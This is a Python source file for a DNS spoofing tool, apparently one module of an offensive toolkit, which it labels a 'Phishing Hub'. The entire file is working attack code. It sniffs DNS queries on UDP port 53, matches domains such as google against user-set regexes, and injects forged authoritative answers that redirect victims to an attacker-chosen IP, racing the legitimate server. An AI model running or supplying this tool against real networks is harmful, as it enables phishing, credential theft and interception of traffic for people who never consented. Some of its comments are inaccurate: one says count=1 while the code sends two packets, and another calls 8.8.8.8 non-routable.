import re
import os
import socket
import sys
import logging
import questionary
from scapy.all import IP, UDP, DNS, DNSRR, DNSQR, send, sniff
from rich.console import Console
from rich.table import Table
from core.ui import show_briefing, Q_STYLE

# Suppress Scapy runtime warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
console = Console()

# Configuration Dictionary
SPOOF_MAP = {}


def get_local_ip():
    """Retrieves the primary local IP address for default redirection."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Use a non-routable address to find the local interface IP
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip


def dns_callback(packet):
    """
    Analyzes DNS queries and injects spoofed responses.
    Optimized for speed to beat the legitimate DNS server response.
    """
    # Check if the packet is a DNS Query (QR=0)
    if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
        qname = packet[DNSQR].qname.decode().strip('.')

        # Check query name against our regex patterns
        for pattern, redirect_ip in SPOOF_MAP.items():
            try:
                if re.search(pattern, qname, re.IGNORECASE):
                    # Construct the DNS response
                    spoofed_pkt = (
                        IP(dst=packet[IP].src, src=packet[IP].dst) /
                        UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
                        DNS(
                            id=packet[DNS].id,
                            qr=1,
                            aa=1,
                            qd=packet[DNS].qd,
                            an=DNSRR(
                                rrname=packet[DNSQR].qname,
                                ttl=10,
                                rdata=redirect_ip,
                                type="A"  # Default to 'A' record
                            )
                        )
                    )

                    # Send packet immediately. 'count=1' ensures minimal overhead.
                    send(spoofed_pkt, verbose=False, count=2)
                    console.print(
                        f"[bold red][!] HIJACKED:[/bold red] {qname} redirected to {redirect_ip}")
                    break  # Pattern found, stop checking others
            except Exception as e:
                console.print(
                    f"[dim red][!] Error processing query: {e}[/dim red]")


def start_dns_spoof():
    """Main execution loop for the DNS Spoofer."""
    if os.getuid() != 0:
        return console.print("[bold red][!] Root privileges required to sniff/inject packets.[/bold red]")

    show_briefing(
        "DNS Spoofer: Phishing Hub",
        "Redirects traffic by forging DNS responses.",
        ["Requires MITM for external targets", "Beats real DNS responses by speed"]
    )

    local_ip = get_local_ip()
    console.print(f"[dim grey]Auto-detected Local IP: {local_ip}[/dim grey]\n")

    # Rule Configuration UI
    while True:
        pattern = questionary.text(
            "Domain Regex (e.g. .*google.*) [Empty to finish]:",
            style=Q_STYLE
        ).ask()

        if not pattern:
            break

        ip = questionary.text(
            f"Redirect IP for '{pattern}' (Default: {local_ip}):",
            default=local_ip,
            style=Q_STYLE
        ).ask()

        # Basic IP validation
        try:
            socket.inet_aton(ip)
            SPOOF_MAP[pattern] = ip
        except socket.error:
            console.print("[red][!] Invalid IP address. Rule skipped.[/red]")

    if SPOOF_MAP:
        # Display Active Table
        table = Table(title="DNS Injection Rules", border_style="cyan")
        table.add_column("Regex Pattern", style="magenta")
        table.add_column("Redirection IP", style="green")
        for p, r in SPOOF_MAP.items():
            table.add_row(p, r)
        console.print(table)

        console.print(
            "\n[bold green][*] DNS Sniffer Active. Listening on UDP 53...[/bold green]")
        console.print(
            "[dim]Press Ctrl+C to safely terminate the spoofer.[/dim]\n")

        try:
            # Filter for UDP port 53 (DNS)
            # store=0 prevents memory leaks during long-term sniffing
            sniff(filter="udp port 53", prn=dns_callback, store=0)
        except KeyboardInterrupt:
            console.print(
                "\n[yellow][-] Shutting down DNS Spoofer...[/yellow]")
        except Exception as e:
            console.print(f"[bold red][!] Sniffer Error: {e}[/bold red]")
    else:
        console.print("[yellow][!] No rules defined. Exiting.[/yellow]")


if __name__ == "__main__":
    start_dns_spoof()
